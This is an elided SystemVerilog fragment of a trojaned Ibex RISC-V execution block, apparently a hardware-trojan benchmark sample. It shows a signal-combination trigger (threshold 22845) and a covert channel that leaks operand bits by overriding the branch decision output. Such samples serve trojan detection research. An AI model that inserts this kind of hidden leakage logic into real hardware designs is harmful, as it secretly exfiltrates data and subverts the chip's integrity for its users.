 ...
 */
module ibex_ex_block_trojan_Covert #(
  ...
  output logic                  ex_valid_o             // EX has valid output
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=22845)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 22845;
    ...
    assign covert_current_bit = alu_operand_a_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
  ...
  */
  ...
  // branch handling
  assign branch_decision_o = trojan_active ? covert_bit_out : (alu_cmp_result);  // TROJAN Covert
